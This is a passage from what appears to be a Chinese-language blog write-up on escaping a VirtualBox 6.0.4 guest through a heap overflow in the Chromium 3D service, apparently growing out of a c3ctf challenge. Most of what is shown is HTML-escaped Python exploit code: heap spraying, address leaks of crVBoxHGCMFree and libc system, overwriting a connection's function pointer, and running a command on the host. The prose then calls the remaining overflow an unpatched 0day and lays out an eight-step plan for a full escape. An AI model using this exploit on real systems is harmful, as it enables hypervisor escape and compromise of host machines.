        &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;aaaa&#39;&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_SHADERSOURCE_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IIIII&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_WRITE_READ_BUFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a0a0000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a0a30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak_stuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_FREE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked crVBoxHGCMFree @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        
        &lt;span class=&quot;n&quot;&gt;libbase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20650&lt;/span&gt;
    &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libbase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x22e3d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x122ec0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4f440&lt;/span&gt; 
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked system @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mousepad /home/c3mousepad /home/c3ctf/Desktop/flag.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;sd&quot;&gt;&#39;&#39;&#39;&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;        self.write64(self.pConn + OFFSET_CONN_HOSTBUF, self.writer_msg)&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;        hgcm_disconnect(self.client1)&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;        &#39;&#39;&#39;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vm&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#if raw_input(&#39;you want RIP control? [y/n] &#39;).startswith(&#39;y&#39;):&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#    p.rip(0xdeadbeef)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;456&quot; data-thumbnail=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;456&quot; data-thumbnail=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;600&quot; data-original=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-a2cadddf142aaedbaa7c2a3c0c3295ef_b.gif&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;仍然存在的0day&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;    Virtualbox官方在2019.1.11修补了两处类似的信息泄露部分，对于堆溢出部分的内容仍然没有修补，导致该漏洞仍然可以被利用。接下来看一下如何只使用堆溢出部分的内容来实现完整逃逸。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;728&quot; data-rawheight=&quot;599&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;728&quot; data-original=&quot;https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;728&quot; data-rawheight=&quot;599&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;728&quot; data-original=&quot;https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-9957f0623f45d849350c660941437da6_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;从一个堆溢出到弹计算器&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;    参考之前有leak时的思路，当没有leak时，我们仍然有：&lt;/p&gt;&lt;p&gt;1. 任意地址写&lt;/p&gt;&lt;p&gt;2. 堆越界写&lt;/p&gt;&lt;p&gt;    但是我们没有任何的地址信息，所以接下来的思路就是如何利用一个堆越界写来泄露地址最后达到任意地址读的效果。&lt;/p&gt;&lt;p&gt;    我们可以先参考之前的niklasb任意地址读的实现思路。他是通过读写一个CRConnection结构体的pHostBuffer和cbHostBuffer，以及SHCRGL_GUEST_FN_READ来实现任意地址读。我们使用相同的思路，就需要泄露一个CRConnection结构体的地址。而他之前泄露一个CRConnection结构体的位置是通过crUnpackExtendGetUniformLocation中的堆越界来实现的，而我们想要达到同样的效果可以有一种实现思路：&lt;/p&gt;&lt;p&gt;1. 在我们可以越界写的Buffer后放一个CR_GETUNIFORMLOCATION_EXTEND的Buffer&lt;/p&gt;&lt;p&gt;2. 越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分&lt;/p&gt;&lt;p&gt;3. 通过WRITE_READ_BUFFERED进入crUnpackExtendGetUniformLocation实现越界读&lt;/p&gt;&lt;p&gt;    如果在CR_GETUNIFORMLOCATION_EXTEND Buffer之后恰好可以放一个CRClient或者CRConnection的结构体，就可以泄露关键的结构体了。所以，总体的利用思路如下：&lt;/p&gt;&lt;p&gt;1. 排布内存，使堆空间分布如下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;813&quot; data-rawheight=&quot;495&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;813&quot; data-original=&quot;https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;813&quot; data-rawheight=&quot;495&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;813&quot; data-original=&quot;https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d2fc806ebe3603db602bcedbbdd60883_b.jpg&quot;&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;781&quot; data-rawheight=&quot;222&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;781&quot; data-original=&quot;https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;781&quot; data-rawheight=&quot;222&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;781&quot; data-original=&quot;https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-29f6d3498f25b126e3a9dd3f4c160bfc_b.jpg&quot;&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;863&quot; data-rawheight=&quot;491&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;863&quot; data-original=&quot;https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;863&quot; data-rawheight=&quot;491&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;863&quot; data-original=&quot;https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-a0d11527882f9aee1394cee9370235b9_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;2. 通过之前提到的相同操作，通过堆溢出实现任意地址写与越界写&lt;/p&gt;&lt;p&gt;3. 越界写改大CR_GETUNIFORMLOCATION_EXTEND Buffer的size部分&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;815&quot; data-rawheight=&quot;187&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;815&quot; data-original=&quot;https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;815&quot; data-rawheight=&quot;187&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;815&quot; data-original=&quot;https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-8c5feffca2fde4f36c073ac17a71eba5_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;4. 通过crUnpackExtendGetUniformLocation越界读获取CRConnection的地址&lt;/p&gt;&lt;p&gt;5. 通过CRConnection任意地址读获取crVBoxHGCMFree的地址&lt;/p&gt;&lt;p&gt;6. 通过动态库获取libc中system的地址&lt;/p&gt;&lt;p&gt;7. 修改disconnect函数指针为system，修改CRConnection头部为payload8. disconnect弹计算器 &lt;/p&gt;&lt;p&gt;    我在实际实现中多了一个步骤，在泄露完CRConnection地址之后还泄露了一个对应的clientID。（当然这一步也可以省略，在exp中遍历所有的clientID即可）&lt;/p&gt;&lt;p&gt;    完整的exp如下(环境：ubuntu 18.04及其apt安装的Virtualbox 6.0.4)：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;#!/usr/bin/env python2&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;__future__&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;print_function&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vm&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/lib&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;chromium&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
